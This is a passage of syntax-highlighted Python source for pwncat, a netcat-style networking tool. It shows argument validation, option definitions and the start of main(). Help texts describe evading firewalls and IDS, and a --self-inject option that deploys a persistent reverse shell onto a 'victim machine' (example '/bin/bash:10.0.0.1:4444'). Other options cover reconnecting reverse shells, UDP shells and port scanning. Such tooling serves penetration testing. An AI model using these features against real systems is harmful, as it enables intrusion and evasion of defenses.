    <span class="hljs-keyword">if</span> args.keep_open <span class="hljs-keyword">and</span> <span
                            class="hljs-keyword">not</span> args.listen:
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: --keep-open only works with -l/--listen"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [ADVANCED] --reconn</span>
    <span class="hljs-keyword">if</span> args.reconn != <span class="hljs-number">0</span> <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> connect_mode:
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: --reconn only works in connect mode"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [ADVANCED] --ping-init</span>
    <span class="hljs-keyword">if</span> args.ping_init <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">False</span> <span
                            class="hljs-keyword">and</span> (args.listen <span class="hljs-keyword">or</span> args.local):
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: --ping-init mutually excl. with -l/--listen or -L/--local"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># [ADVANCED] --udp-sconnect</span>
    <span class="hljs-keyword">if</span> args.udp_sconnect <span
                            class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> connect_mode:
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: --udp-sconnect only works in connect mode"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [10/11 COMMAND LINE ARGUMENTS]: (2/2) Argument Parser</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">get_args</span>():</span>
    <span class="hljs-comment"># type: () -&gt; argparse.Namespace</span>
    <span class="hljs-string">"""Retrieve command line arguments."""</span>
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=<span class="hljs-literal">False</span>,
        usage=<span class="hljs-string">"""%(prog)s [options] hostname port
       %(prog)s [options] -l [hostname] port
       %(prog)s [options] -z hostname port
       %(prog)s [options] -L [addr:]port hostname port
       %(prog)s [options] -R addr:port hostname port
       %(prog)s -V, --version
       %(prog)s -h, --help
       """</span>
        % ({<span class="hljs-string">"prog"</span>: APPNAME}),
        description=<span class="hljs-string">"""
Enhanced and compatible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See options for how to automatically re-
connect."""</span>,
    )

    positional = parser.add_argument_group(<span class="hljs-string">"positional arguments"</span>)
    mode = parser.add_argument_group(<span class="hljs-string">"mode arguments"</span>)
    optional = parser.add_argument_group(<span class="hljs-string">"optional arguments"</span>)
    protocol = parser.add_argument_group(<span class="hljs-string">"protocol arguments"</span>)
    cnc = parser.add_argument_group(<span
                            class="hljs-string">"command &amp; control arguments"</span>)
    pse = parser.add_argument_group(<span class="hljs-string">"pwncat scripting engine"</span>)
    zero = parser.add_argument_group(<span class="hljs-string">"zero-i/o mode arguments"</span>)
    lmode = parser.add_argument_group(<span class="hljs-string">"listen mode arguments"</span>)
    cmode = parser.add_argument_group(<span class="hljs-string">"connect mode arguments"</span>)
    misc = parser.add_argument_group(<span class="hljs-string">"misc arguments"</span>)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Positional arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    positional.add_argument(
        <span class="hljs-string">"hostname"</span>,
        nargs=<span class="hljs-string">"?"</span>,
        type=str,
        help=<span class="hljs-string">"""Address to listen, forward, scan or connect to.

"""</span>,
    )
    positional.add_argument(
        <span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port_list,
        help=<span class="hljs-string">"""[All modes]
Single port to listen, forward or connect to.
[Zero-I/O mode]
Specify multiple ports to scan:
Via list:  4444,4445,4446
Via range: 4444-4446
Via incr:  4444+2
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Mode arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    mode.add_argument(
        <span class="hljs-string">"-l"</span>,
        <span class="hljs-string">"--listen"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""[Listen mode]:
Start a server and listen for incoming connections.
If using TCP and a connected client disconnects or the
connection is interrupted otherwise, the server will
quit. See -k/--keep-open to change this behaviour.

"""</span>,
    )
    mode.add_argument(
        <span class="hljs-string">"-z"</span>,
        <span class="hljs-string">"--zero"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""[Zero-I/0 mode]:
Connect to a remote endpoint and report status only.
Used for port scanning.
See --banner for version detection.

"""</span>,
    )
    mode.add_argument(
        <span class="hljs-string">"-L"</span>,
        <span class="hljs-string">"--local"</span>,
        metavar=<span class="hljs-string">"[addr:]port"</span>,
        type=ArgValidator.type_local,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""[Local forward mode]:
This mode will start a server and a client internally.
The internal server will listen locally on specified
addr/port (given by --local [addr:]port).
The server will then forward traffic to the internal
client which connects to another server specified by
hostname/port given via positional arguments.
(I.e.: proxies a remote service to a local address)

"""</span>,
    )
    mode.add_argument(
        <span class="hljs-string">"-R"</span>,
        <span class="hljs-string">"--remote"</span>,
        metavar=<span class="hljs-string">"addr:port"</span>,
        type=ArgValidator.type_remote,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""[Remote forward mode]:
This mode will start two clients internally. One is
connecting to the target and one is connecting to
another pwncat/netcat server you have started some-
where. Once connected, it will then proxy traffic
between you and the target.
This mode should be applied on machines that block
incoming traffic and only allow outbound.
The connection to your listening server is given by
-R/--remote addr:port and the connection to the
target machine via the positional arguments.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Optional arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    optional.add_argument(
        <span class="hljs-string">"-e"</span>,
        <span class="hljs-string">"--exec"</span>,
        metavar=<span class="hljs-string">"cmd"</span>,
        type=str,
        default=<span class="hljs-literal">False</span>,
        dest=<span class="hljs-string">"cmd"</span>,
        help=<span class="hljs-string">"""Execute shell command. Only for connect or listen mode.

"""</span>,
    )
    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> add --crlf-i and --crlf-o to only do this on input or output and have</span>
    <span class="hljs-comment"># --crlf to always do it on input and output!</span>
    optional.add_argument(
        <span class="hljs-string">"-C"</span>,
        <span class="hljs-string">"--crlf"</span>,
        metavar=<span class="hljs-string">"lf"</span>,
        type=ArgValidator.type_crlf,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""Specify, 'lf', 'crlf' or 'cr' to always force replacing
line endings for input and outout accordingly. Specify
'no' to completely remove any line feeds. By default
it will not replace anything and takes what is entered
(usually CRLF on Windows, LF on Linux and some times
CR on MacOS).

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"-n"</span>,
        <span class="hljs-string">"--nodns"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Do not resolve DNS.

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"--send-on-eof"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Buffer data received on stdin until EOF and send
everything in one chunk.

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"--no-shutdown"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Do not shutdown into half-duplex mode.
If this option is passed, pwncat won't invoke shutdown
on a socket after seeing EOF on stdin. This is provided
for backward-compatibility with OpenBSD netcat, which
exhibits this behavior.

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"-v"</span>,
        <span class="hljs-string">"--verbose"</span>,
        action=<span class="hljs-string">"count"</span>,
        default=<span class="hljs-number">0</span>,
        help=<span class="hljs-string">"""Be verbose and print info to stderr. Use -v, -vv, -vvv
or -vvvv for more verbosity. The server performance will
decrease drastically if you use more than three times.

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"--info"</span>,
        metavar=<span class="hljs-string">"type"</span>,
        type=ArgValidator.type_info,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""Show additional info about sockets, IPv4/6 or TCP opts
applied to the current socket connection. Valid
parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.
Note, you must at least be in INFO verbose mode in order
to see them (-vv).

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"-c"</span>,
        <span class="hljs-string">"--color"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=ArgValidator.type_color,
        default=<span class="hljs-string">"auto"</span>,
        help=<span class="hljs-string">"""Colored log output. Specify 'always', 'never' or 'auto'.
In 'auto' mode, color is displayed as long as the output
goes to a terminal. If it is piped into a file, color
will automatically be disabled. This mode also disables
color on Windows by default. (default: auto)

"""</span>,
    )
    optional.add_argument(
        <span class="hljs-string">"--safe-word"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=str,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""All modes:
If %(prog)s is started with this argument, it will shut
down as soon as it receives the specified string. The
--keep-open (server) or --reconn (client) options will
be ignored and it won't listen again or reconnect to you.
Use a very unique string to not have it shut down
accidentally by other input.
"""</span>
        % ({<span class="hljs-string">"prog"</span>: APPNAME}),
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Protocol arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    protocol.add_argument(
        <span class="hljs-string">"-4"</span>,
        dest=<span class="hljs-string">"ipv4"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Only Use IPv4 (default: IPv4 and IPv6 dualstack).

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"-6"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        dest=<span class="hljs-string">"ipv6"</span>,
        help=<span class="hljs-string">"""Only Use IPv6 (default: IPv4 and IPv6 dualstack).

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"-u"</span>,
        <span class="hljs-string">"--udp"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Use UDP for the connection instead of TCP.

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"-T"</span>,
        <span class="hljs-string">"--tos"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=ArgValidator.type_tos,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""Specifies IP Type of Service (ToS) for the connection.
Valid values are the tokens 'mincost', 'lowcost',
'reliability', 'throughput' or 'lowdelay'.

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"--http"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect / Listen mode (TCP and UDP):
Hide traffic in http packets to fool Firewalls/IDS/IPS.

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"--https"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect / Listen mode (TCP and UDP):
Hide traffic in https packets to fool Firewalls/IDS/IPS.

"""</span>,
    )
    protocol.add_argument(
        <span class="hljs-string">"-H"</span>,
        <span class="hljs-string">"--header"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        nargs=<span class="hljs-string">"*"</span>,
        default=[],
        help=<span class="hljs-string">"""Add HTTP headers to your request when using --http(s)."""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Command &amp; Control arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    cnc.add_argument(
        <span class="hljs-string">"--self-inject"</span>,
        metavar=<span class="hljs-string">"cmd:host:port[s]"</span>,
        type=ArgValidator.type_self_inject,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""Listen mode (TCP only):
If you are about to inject a reverse shell onto the
victim machine (via php, bash, nc, ncat or similar),
start your listening server with this argument.
This will then (as soon as the reverse shell connects)
automatically deploy and background-run an unbreakable
pwncat reverse shell onto the victim machine which then
also connects back to you with specified arguments.
Example: '--self-inject /bin/bash:10.0.0.1:4444'
It is also possible to launch multiple reverse shells by
specifying multiple ports.
Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
Note: this is currently an experimental feature and does
not work on Windows remote hosts yet.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># PSE arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    pse.add_argument(
        <span class="hljs-string">"--script-send"</span>,
        metavar=<span class="hljs-string">"file"</span>,
        type=ArgValidator.type_file_content,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed before
sending data to a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be 'transform'
    # NOTE: the function param name must be 'data'
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat's function or classes, as the
file will be called with exec().

"""</span>,
    )
    pse.add_argument(
        <span class="hljs-string">"--script-recv"</span>,
        metavar=<span class="hljs-string">"file"</span>,
        type=ArgValidator.type_file_content,
        default=<span class="hljs-literal">None</span>,
        help=<span class="hljs-string">"""All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed after
receiving data from a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be 'transform'
    # NOTE: the function param name must be 'data'
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat's function or classes, as the
file will be called with exec().
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Zero-I/O mode arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    zero.add_argument(
        <span class="hljs-string">"--banner"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Zero-I/O (TCP and UDP):
Try banner grabbing during port scan.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Listen mode arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    lmode.add_argument(
        <span class="hljs-string">"-k"</span>,
        <span class="hljs-string">"--keep-open"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Listen mode (TCP only):
Re-accept new clients in listen mode after a client has
disconnected or the connection is interrupted otherwise.
(default: server will quit after connection is gone)

"""</span>,
    )
    lmode.add_argument(
        <span class="hljs-string">"--rebind"</span>,
        metavar=<span class="hljs-string">"x"</span>,
        nargs=<span class="hljs-string">"?"</span>,
        type=int,
        default=<span class="hljs-number">0</span>,
        help=<span class="hljs-string">"""Listen mode (TCP and UDP):
If the server is unable to bind, it will re-initialize
itself x many times before giving up. Omit the
quantifier to rebind endlessly or specify a positive
integer for how many times to rebind before giving up.
See --rebind-robin for an interesting use-case.
(default: fail after first unsuccessful try).

"""</span>,
    )
    lmode.add_argument(
        <span class="hljs-string">"--rebind-wait"</span>,
        metavar=<span class="hljs-string">"s"</span>,
        type=float,
        default=<span class="hljs-number">1.0</span>,
        help=<span class="hljs-string">"""Listen mode (TCP and UDP):
Wait x seconds between re-initialization. (default: 1)

"""</span>,
    )
    lmode.add_argument(
        <span class="hljs-string">"--rebind-robin"</span>,
        metavar=<span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port_list,
        default=[],
        help=<span class="hljs-string">"""Listen mode (TCP and UDP):
If the server is unable to initialize (e.g: cannot bind
and --rebind is specified, it it will shuffle ports in
round-robin mode to bind to.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Set --rebind to at least the number of ports to probe +1
This option requires --rebind to be specified.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Connect mode arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    cmode.add_argument(
        <span class="hljs-string">"--source-addr"</span>,
        metavar=<span class="hljs-string">"addr"</span>,
        type=str,
        default=<span class="hljs-literal">None</span>,
        dest=<span class="hljs-string">"source_addr"</span>,
        help=<span class="hljs-string">"""Specify source bind IP address for connect mode.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--source-port"</span>,
        metavar=<span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port,
        default=<span class="hljs-literal">None</span>,
        dest=<span class="hljs-string">"source_port"</span>,
        help=<span class="hljs-string">"""Specify source bind port for connect mode.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--reconn"</span>,
        metavar=<span class="hljs-string">"x"</span>,
        nargs=<span class="hljs-string">"?"</span>,
        type=int,
        default=<span class="hljs-number">0</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
If the remote server is not reachable or the connection
is interrupted, the client will connect again x many
times before giving up. Omit the quantifier to retry
endlessly or specify a positive integer for how many
times to retry before giving up.
(default: quit if the remote is not available or the
connection was interrupted)
This might be handy for stable TCP reverse shells ;-)
Note on UDP:
By default UDP does not know if it is connected, so
it will stop at the first port and assume it has a
connection. Consider using --udp-sconnect with this
option to make UDP aware of a successful connection.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--reconn-wait"</span>,
        metavar=<span class="hljs-string">"s"</span>,
        type=float,
        default=<span class="hljs-number">1.0</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
Wait x seconds between re-connects. (default: 1)

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--reconn-robin"</span>,
        metavar=<span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port_list,
        default=[],
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
If the remote server is not reachable or the connection
is interrupted and --reconn is specified, the client
will shuffle ports in round-robin mode to connect to.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Set --reconn to at least the number of ports to probe +1
This helps reverse shell to evade intrusiona prevention
systems that will cut your connection and block the
outbound port.
This is also useful in Connect or Zero-I/O mode to
figure out what outbound ports are allowed.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--ping-init"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
UDP is a stateless protocol unlike TCP, so no hand-
shake communication takes place and the client just
sends data to a server without being "accepted" by
the server first.
This means a server waiting for an UDP client to
connect to, is unable to send any data to the client,
before the client hasn't send data first. The server
simply doesn't know the IP address before an initial
connect.
The --ping-init option instructs the client to send one
single initial ping packet to the server, so that it is
able to talk to the client.
This is a way to make a UDP reverse shell work.
See --ping-word for what char/string to send as initial
ping packet (default: '\\0')

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--ping-intvl"</span>,
        metavar=<span class="hljs-string">"s"</span>,
        type=int,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
Instruct the client to send ping intervalls every s sec.
This allows you to restart your UDP server and just wait
for the client to report back in. This might be handy
for stable UDP reverse shells ;-)
See --ping-word for what char/string to send as initial
ping packet (default: '\\0')

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--ping-word"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=str,
        default=<span class="hljs-string">"\0"</span>,
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
Change the default character '\\0' to use for upd ping.
Single character or strings are supported.

"""</span>,
    )
    <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> Isn't this already covered by --reconn-robin or --zero</span>
    <span class="hljs-comment"># What should be the behaviour (keep connection or hop on?)</span>
    cmode.add_argument(
        <span class="hljs-string">"--ping-robin"</span>,
        metavar=<span class="hljs-string">"port"</span>,
        type=ArgValidator.type_port_list,
        default=[],
        help=<span class="hljs-string">"""Connect mode (TCP and UDP):
Instruct the client to shuffle the specified ports in
round-robin mode for a remote server to ping.
This might be handy to scan outbound allowed ports.
Use comma separated string such as '80,81,82,83', a range
of ports '80-83' or an increment '80+3'.
Use --ping-intvl 0 to be faster.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--udp-sconnect"</span>,
        action=<span class="hljs-string">"store_true"</span>,
        default=<span class="hljs-literal">False</span>,
        help=<span class="hljs-string">"""Connect mode (UDP only):
Emulating stateful behaviour for UDP connect phase by
sending an initial packet to the server to validate if
it is actually connected.
By default, UDP will simply issue a connect and is not
aware if it is really connected or not.
The default connect packet to be send is '\\0', you
can change this with --udp-sconnect-word.

"""</span>,
    )
    cmode.add_argument(
        <span class="hljs-string">"--udp-sconnect-word"</span>,
        nargs=<span class="hljs-string">"?"</span>,
        metavar=<span class="hljs-string">"str"</span>,
        type=str,
        default=<span class="hljs-string">"\0"</span>,
        help=<span class="hljs-string">"""Connect mode (UDP only):
Change the the data to be send for UDP stateful connect
behaviour. Note you can also omit the string to send an
empty packet (EOF), but be aware that some servers such
as netcat will instantly quit upon receive of an EOF
packet.
The default is to send a null byte sting: '\\0'.
"""</span>,
    )

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Misc arguments</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    misc.add_argument(<span class="hljs-string">"-h"</span>, <span
                            class="hljs-string">"--help"</span>, action=<span class="hljs-string">"help"</span>, help=<span
                            class="hljs-string">"Show this help message and exit"</span>)
    misc.add_argument(
        <span class="hljs-string">"-V"</span>,
        <span class="hljs-string">"--version"</span>,
        action=<span class="hljs-string">"version"</span>,
        version=get_version(),
        help=<span class="hljs-string">"Show version information and exit"</span>,
    )

    <span class="hljs-comment"># Retrieve arguments</span>
    args = parser.parse_args()

    <span class="hljs-comment"># Check mutually exclive arguments</span>
    _args_check_mutually_exclusive(parser, args)

    <span class="hljs-comment"># Only Zero-I/O mode allows multiple ports</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.zero <span
                            class="hljs-keyword">and</span> len(args.port) &gt; <span
                            class="hljs-number">1</span>:
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: Only Zero-I/O mode supports multiple ports"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># Connect mode and Zero-I/O mode require hostname and port to be set</span>
    connect_mode = <span class="hljs-keyword">not</span> (args.listen <span
                            class="hljs-keyword">or</span> args.zero <span
                            class="hljs-keyword">or</span> args.local <span
                            class="hljs-keyword">or</span> args.remote)
    <span class="hljs-keyword">if</span> (connect_mode <span class="hljs-keyword">or</span> args.zero <span
                            class="hljs-keyword">or</span> args.local) <span class="hljs-keyword">and</span> <span
                            class="hljs-keyword">not</span> args.hostname:
        parser.print_usage()
        print(
            <span class="hljs-string">"%s: error: the following arguments are required: hostname"</span> % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-comment"># Deny unimplemented modes</span>
    <span class="hljs-keyword">if</span> args.https:
        print(<span class="hljs-string">"Unimplemented options"</span>, file=sys.stderr)
        sys.exit(<span class="hljs-number">1</span>)

    <span class="hljs-keyword">return</span> args


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   11 / 11   M A I N   E N T R Y P O I N T</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [11/11 MAIN ENTRYPOINT]: (1/2) main</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">main</span>():</span>
    <span class="hljs-comment"># type: () -&gt; None</span>
    <span class="hljs-string">"""Run the program."""</span>
    args = get_args()

    <span class="hljs-comment"># Determine current mode</span>
    mode = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (args.listen <span
                            class="hljs-keyword">or</span> args.local <span
                            class="hljs-keyword">or</span> args.remote <span
                            class="hljs-keyword">or</span> args.zero):
        mode = <span class="hljs-string">"connect"</span>
        ports = [args.port[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">elif</span> args.listen:
        mode = <span class="hljs-string">"listen"</span>
        ports = [args.port[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">elif</span> args.local:
        mode = <span class="hljs-string">"local"</span>
        ports = [args.port[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">elif</span> args.remote:
        mode = <span class="hljs-string">"remote"</span>
        ports = [args.port[<span class="hljs-number">0</span>]]
    <span class="hljs-keyword">elif</span> args.zero:
        mode = <span class="hljs-string">"scan"</span>
        ports = args.port
    <span class="hljs-keyword">assert</span> mode <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>

    host = args.hostname

    <span class="hljs-comment"># No argument supplied --udp-sconnect-word to it</span>
    <span class="hljs-keyword">if</span> args.udp_sconnect_word <span class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span>:
        udp_sconnect_word = <span class="hljs-string">""</span>
    <span class="hljs-comment"># --udp-sconnect-word not specified</span>
    <span class="hljs-keyword">elif</span> args.udp_sconnect_word == <span
                            class="hljs-string">""</span>:
        udp_sconnect_word = <span class="hljs-string">"\0"</span>
    <span class="hljs-keyword">else</span>:
        udp_sconnect_word = args.udp_sconnect_word

    reconn = <span class="hljs-number">-1</span> <span
                            class="hljs-keyword">if</span> args.reconn <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">else</span> args.reconn
    rebind = <span class="hljs-number">-1</span> <span
                            class="hljs-keyword">if</span> args.rebind <span
                            class="hljs-keyword">is</span> <span
                            class="hljs-literal">None</span> <span class="hljs-keyword">else</span> args.rebind

    <span class="hljs-comment"># Set pwncat options</span>
    sock_opts = DsIONetworkSock(
        RECV_BUFSIZE,
        LISTEN_BACKLOG,
        TIMEOUT_RECV_SOCKET,
        TIMEOUT_RECV_SOCKET_RETRY,
        args.nodns,
        args.ipv4,
        args.ipv6,
        args.source_addr,
        args.source_port,
        args.udp,
        <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> args.zero <span
                            class="hljs-keyword">else</span> args.udp_sconnect,
        udp_sconnect_word,
        args.tos,
        args.info,
    )
    srv_opts = DsIONetworkSrv(args.keep_open, rebind, args.rebind_wait, args.rebind_robin)
    cli_opts = DsIONetworkCli(reconn, args.reconn_wait, args.reconn_robin)

    <span class="hljs-comment"># Map pwncat verbosity to Python's Logger loglevel</span>
    logmap = {
        <span class="hljs-number">0</span>: logging.ERROR,
        <span class="hljs-number">1</span>: logging.WARNING,
        <span class="hljs-number">2</span>: logging.INFO,
        <span class="hljs-number">3</span>: logging.DEBUG,
    }
    loglevel = logmap.get(args.verbose, TraceLogger.LEVEL_NUM)

    <span class="hljs-comment"># Use a colored log formatter</span>
    formatter = ColoredLogFormatter(args.color, loglevel)
    handler = logging.StreamHandler()
    handler.setLevel(loglevel)
    handler.setFormatter(formatter)

    <span class="hljs-comment"># Use a custom logger with TRACE level</span>
    logging.setLoggerClass(TraceLogger)
    logger = logging.getLogger(__name__)
    logger.setLevel(loglevel)
    logger.addHandler(handler)

    <span class="hljs-comment"># Initialize encoder</span>
    enc = StringEncoder()

    <span class="hljs-comment"># Initialize interrupt handler</span>
    ssig = InterruptHandler(args.keep_open, args.no_shutdown)

    <span class="hljs-comment"># Initialize transformers</span>
    transformers = []
    <span class="hljs-keyword">if</span> args.safe_word <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        transformers.append(TransformSafeword(DsTransformSafeword(ssig, args.safe_word)))
    <span class="hljs-keyword">if</span> args.crlf <span class="hljs-keyword">is</span> <span
                            class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
        transformers.append(TransformLinefeed(DsTransformLinefeed(args.crlf)))

    <span class="hljs-comment"># Initialize scripting engine transformers</span>
    code_send = <span class="hljs-literal">None</span>
    code_recv = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> args.script_send <span class="hljs-keyword">is</span> <span
